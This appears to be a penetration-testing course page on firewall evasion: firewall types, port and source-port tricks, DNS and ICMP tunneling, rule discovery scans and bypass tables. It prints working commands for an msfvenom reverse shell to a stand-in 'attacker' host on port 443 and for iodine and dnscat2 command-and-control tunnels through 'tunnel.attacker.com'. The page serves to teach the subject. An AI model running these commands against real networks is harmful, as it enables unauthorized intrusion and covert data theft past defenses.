# Firewall Evasion

## Unit 10 - Topic 2 | Network Defense Evasion

---

## Overview

**Firewalls** filter traffic based on rules, blocking unauthorized connections. Penetration testers must understand firewall types, how they inspect traffic, and techniques to bypass their rules — including tunneling, port manipulation, and protocol abuse.

---

## 1. Firewall Types

```
FIREWALL CLASSIFICATION:

PACKET FILTERING (Stateless):
├── Inspects individual packets (IP, port, protocol)
├── No connection tracking
├── Fast but limited
├── Example: Basic ACLs on routers
└── Evasion: Easy — fragmentation, spoofing

STATEFUL INSPECTION:
├── Tracks connection state (SYN, ESTABLISHED)
├── Only allows packets matching known connections
├── Blocks unsolicited inbound packets
├── Example: iptables, Windows Firewall
└── Evasion: Moderate — need established connection

APPLICATION LAYER (WAF/NGFW):
├── Inspects payload content (Layer 7)
├── Deep packet inspection (DPI)
├── Protocol-aware (HTTP, DNS, etc.)
├── Example: Palo Alto, Fortinet, ModSecurity
└── Evasion: Hard — encryption, protocol abuse

NEXT-GEN FIREWALLS (NGFW):
├── All of the above + IPS + threat intel
├── SSL/TLS inspection
├── User/application awareness
├── Example: Palo Alto, Cisco Firepower
└── Evasion: Very hard — need creative approaches
```

---

## 2. Firewall Evasion Techniques

```bash
# === PORT-BASED EVASION ===
# Use commonly allowed ports:
# Port 80 (HTTP) — almost always open
# Port 443 (HTTPS) — almost always open
# Port 53 (DNS) — usually open
# Port 25 (SMTP) — often open

# Reverse shell on port 443:
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=attacker LPORT=443 -f exe -o shell.exe

# Listener on port 443:
use exploit/multi/handler
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_https
run

# === SOURCE PORT MANIPULATION ===
# Some firewalls allow traffic from "trusted" source ports:
nmap --source-port 53 target.com    # Appear as DNS response
nmap --source-port 80 target.com    # Appear as web response

# Netcat with source port:
nc -p 53 target.com 8080

# === TUNNELING ===
# HTTP Tunnel:
# Wrap arbitrary data inside HTTP requests

# DNS Tunnel:
iodine -f dns.attacker.com tunnel_server
# Encapsulates data in DNS queries
# Works when only DNS is allowed!

# ICMP Tunnel:
icmpsh (attacker) + icmpsh (client)
# Hide data in ICMP echo/reply packets

# === PROTOCOL ABUSE ===
# WebSocket — persistent HTTP connection
# HTTP chunked encoding — split payload
# HTTP pipelining — multiple requests in one connection
```

---

## 3. DNS Tunneling (Detailed)

```bash
# === DNS TUNNELING CONCEPT ===
# Even locked-down networks usually allow DNS!
# Encode data as DNS queries/responses

# HOW IT WORKS:
# Client: "What is aGVsbG8.tunnel.attacker.com?"
# DNS resolves → reaches attacker's DNS server
# Attacker responds with encoded data in DNS response
# Bidirectional communication via DNS!

# === IODINE (IP over DNS) ===
# Server (attacker — must control DNS zone):
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client (compromised host):
iodine -f -P password tunnel.attacker.com
# Creates tun0 interface → full IP tunnel!

# === DNSCAT2 (C2 over DNS) ===
# Server:
ruby dnscat2.rb tunnel.attacker.com

# Client:
./dnscat2 tunnel.attacker.com
# Provides: shell, file transfer, port forwarding

# === DETECTION ===
# DNS tunneling indicators:
# ├── Unusually long domain names
# ├── High volume of DNS queries
# ├── TXT record queries (large data)
# ├── Queries to unusual domains
# └── Base64/hex patterns in subdomains
```

---

## 4. Firewall Rule Discovery

```bash
# === IDENTIFY FIREWALL RULES ===
# Nmap ACK scan (find filtered ports):
nmap -sA target.com
# Unfiltered = no firewall on this port
# Filtered = firewall blocking

# FIN scan:
nmap -sF target.com
# FIN packets may pass stateless firewalls

# Window scan:
nmap -sW target.com
# Differentiates open/closed behind firewall

# Firewalking:
firewalk -S TCP -d target.com -g gateway_ip
# Discover firewall rules by TTL analysis

# === IDENTIFY FIREWALL TYPE ===
# Nmap fingerprinting:
nmap -O target.com         # OS detection may reveal FW
nmap --script firewalk target.com

# Banner grab:
nc -v target.com 80
# Some firewalls reveal their identity in banners

# Traceroute:
traceroute target.com
# Identify where packets are dropped/filtered
```

---

## 5. Bypassing Common Rules

| Scenario | Bypass Technique |
|----------|-----------------|
| **Outbound blocked** | DNS tunnel, ICMP tunnel |
| **Only HTTP allowed** | HTTP tunnel (reGeorg, Neo-reGeorg) |
| **Only HTTPS allowed** | Reverse HTTPS shell on 443 |
| **DPI inspecting HTTP** | Encrypt payload, use HTTPS |
| **All ports blocked** | DNS tunnel (port 53 usually open) |
| **Egress filtering** | Find allowed outbound port |
| **SSL inspection** | Certificate pinning, non-standard TLS |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Packet filter** | Basic IP/port rules (easy to evade) |
| **Stateful** | Tracks connections (moderate to evade) |
| **NGFW/DPI** | Inspects content (hard to evade) |
| **Port 443** | Best port for reverse shells |
| **DNS tunnel** | Works when almost nothing else does |
| **ACK scan** | Discover firewall filter rules |

---

## Quick Revision Questions

1. **What is the difference between stateless and stateful firewalls?**
2. **Why is port 443 commonly used for evasion?**
3. **How does DNS tunneling bypass firewalls?**
4. **What Nmap scan type discovers firewall rules?**
5. **What is deep packet inspection (DPI)?**

---

[← Previous: IDS/IPS Evasion](01-ids-ips-evasion.md) | [Next: Traffic Obfuscation →](03-traffic-obfuscation.md)

---

*Unit 10 - Topic 2 of 5 | [Back to README](../README.md)*
